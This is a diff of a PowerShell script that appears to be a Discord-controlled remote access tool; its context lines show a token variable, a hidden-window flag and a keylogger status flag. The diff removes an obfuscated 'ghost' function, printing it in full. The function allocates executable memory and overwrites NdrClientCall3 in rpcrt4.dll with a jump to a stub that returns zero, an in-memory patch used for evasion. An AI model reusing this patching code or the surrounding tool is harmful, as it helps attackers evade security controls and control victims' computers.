@@ -3,66 +3,7 @@ $global:token = $token
 $script:Jobs = @{}
 $global:hidewindow = $false
 $global:keyloggerstatus = $false
-# ghost ---
-function ghost{
-   Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
 
-public class Mem {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
-
-    [DllImport("kernel32.dll")]
-    public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
-
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
-}
-"@
-
-$PAGE_EXECUTE_READWRITE = 0x40;
-$mem_coMmit = 0X1000; 
-$MEm_ReServe = 0X2000; 
-$pATCh_sizE = 12; # ALLOCate TrAmpolINe: MOv Eax, 0; reT 
-$SIZE = [UIntpTr]::op_ExPLicit(0x1000) 
-$trAmpoLIne = [Mem]::vIRTualAllOC([InTPtR]::zeRo, $Size, $Mem_comMIT -bOr $MEm_REservE, $PagE_exEcUTe_rEAdWrite) 
-# exit iF tramPoLIne aLLOcAtIon faIled 
-IF ($TrAMPOliNe -eq [INTptr]::zErO) 
-{   wrITE-eRROR "[-] FAILeD tO aLlOCATe trAmPoLiNE."     
-    return 
-} 
-# wriTE HOoK: mOV eaX, 0; RET 
-$hoOk = [ByTE[]](0xb8, 0x00, 0x00, 0X00, 0X00, 0XC3) 
-[SYStEm.rUntiMe.inteRoPservIcEs.MARShal]::CoPy($hook, 0, $tramPOLiNe, $hooK.LengTh) 
-# FlUsH InStrucTioN CacHE 
-$LEn = [UIntPTR]::oP_eXplicIt($HOoK.lenGtH) 
-[Mem]::FLuSHINsTRuCtIOncaCHE([mem]::geTCURRentpRoCeSs(), $tRampOlInE, $LEn) | ouT-NulL 
-# gEt fUNcTiOn aDDrESS 
-$liB = [Mem]::loaDLibRaRy("rPcRt4.Dll") 
-$FuNC = [Mem]::GetpROcaDDress($LIb, "NdrClientCall3") 
-IF ($FuNc -Eq [InTptr]::zERo) 
-{   WrItE-eRror "[-] FAIlED To lOCAte NdrClientCall3."     
-    return 
-} 
-# UNpRoTEcT TaRGEt MeMOry 
-$Oldprotect = 0 
-[Mem]::VIrTUAlprOTect($func, [UINtPtr]::OP_expLiciT($pAtch_sIze), $paGE_EXecUtE_REAdwRITe, [ref]$OlDProTEcT) | OUT-NuLl 
-# wrITE PatCh: moV raX, TrampOLiNe; JMP RAx 
-$TRaMPADdR = $TRaMPOLINE.ToiNt64() 
-$pATcH = [byTe[]](0X48, 0xB8) + [biTCONVerTEr]::getByTES($TraMPaDdr) + [byTE[]](0xfF, 0xe0) 
-[SySTem.RunTiMe.InTEroPserVicES.MarsHAL]::cOpY($pAtCH, 0, $FUNC, $PAtcH.leNGth) 
-
-}
 
 # =============================================================== CORE DISCORD FUNCTIONS =========================================================================
 
@@ -1236,4 +1177,5 @@ while ($true) {
     }
     
     Start-Sleep -Seconds 3
+
 }
